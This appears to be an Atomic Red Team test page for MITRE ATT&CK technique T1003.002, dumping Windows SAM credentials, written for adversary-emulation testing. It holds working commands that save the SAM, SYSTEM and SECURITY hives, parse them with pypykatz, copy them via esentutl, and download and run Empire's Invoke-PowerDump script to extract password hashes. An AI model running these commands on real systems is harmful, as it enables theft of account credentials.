# T1003.002 - OS Credential Dumping: Security Account Manager
Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.

A number of tools can be used to retrieve the SAM file through in-memory techniques:

* pwdumpx.exe
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)
* secretsdump.py

Alternatively, the SAM can be extracted from the Registry with Reg:

* <code>reg save HKLM\sam sam</code>
* <code>reg save HKLM\system system</code>

Creddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)

Notes: 
* RID 500 account is the local, built-in administrator.
* RID 501 is the guest account.
* User accounts start with a RID of 1,000+.


## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Registry dump of SAM, creds, and secrets
Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7

Upon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
reg save HKLM\sam %temp%\sam
reg save HKLM\system %temp%\system
reg save HKLM\security %temp%\security
```

Invoke-AtomicTest T1003.002 -TestNumbers 1

### Atomic Test #2 - Registry parse with pypykatz
Parses registry hives to obtain stored credentials

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
pypykatz live registry
```

Invoke-AtomicTest T1003.002 -TestNumbers 2

### Atomic Test #3 - esentutl.exe SAM copy
Copy the SAM hive using the esentutl.exe utility
This can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
del #{copy_dest}\#{file_name} & esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}
```

Invoke-AtomicTest T1003.002 -TestNumbers 3

### Atomic Test #4 - PowerDump Registry dump of SAM for hashes and usernames
Executes a hashdump by reading the hasshes from the registry.
**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
Invoke-Webrequest -Uri "https://github.com/BC-SECURITY/Empire/blob/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1" -UseBasicParsing -OutFile "$Env:Temp\PowerDump.ps1"
Import-Module .\PowerDump.ps1
Invoke-PowerDump```

Invoke-AtomicTest T1003.002 -TestNumbers 4

## Detection
Hash dumpers open the Security Accounts Manager (SAM) on the local file system (<code>%SystemRoot%/system32/config/SAM</code>) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well.